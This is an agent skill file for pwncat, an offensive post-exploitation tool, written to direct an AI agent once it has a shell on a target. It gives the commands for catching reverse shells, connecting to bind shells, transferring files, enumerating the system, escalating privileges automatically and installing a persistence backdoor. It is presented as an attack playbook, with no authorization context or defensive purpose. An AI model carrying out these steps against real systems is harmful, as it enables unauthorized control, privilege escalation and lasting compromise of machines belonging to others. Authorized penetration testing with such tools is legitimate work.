---
name: pwncat-shell-manager
description: "pwncat: Shell hosting and automatic privilege escalation. Signals: webshell, RCE, start listener, file transfer, list available privilege escalations."
zh-signals: "pwncat: shell 托管+自动提权。信号:webshell,rce,起监听,文件传输,列可用提权。"
when-to-use: >-
  Use after obtaining a shell when you need automatic TTY upgrade, file
  transfer, system enumeration, privilege escalation attempts, or persistence;
  can connect to a bind shell or start a listener.
---

# pwncat

- Attack Category: C13 Remote Command Execution and WebShell
- Upstream Repository: https://github.com/calebstewart/pwncat
- Upstream License: MIT (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
pip install pwncat-cs
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `pwncat-cs 10.0.0.5:4444` | Connect to a bind shell |
| `pwncat-cs -lp 4444` | Start listener |
| `upload/download` | File transfer |
| `escalate -l` | List available privilege escalations |
| `run enumerate.system` | Enumeration module |
| `backdoor install` | Install a persistence backdoor |

## Attack Scenario Playbook

### Shell Hosting with Automatic Privilege Escalation

```bash
pwncat-cs -lp 4444  # The TTY upgrades automatically once the target sends back a shell
pwncat> escalate run  # Enumerates sudo/SUID/capabilities and attempts privilege escalation
```

## Notes

A Python netcat upgrade that handles TTY/echo automatically; the cs version is compatible with the original pwncat project.
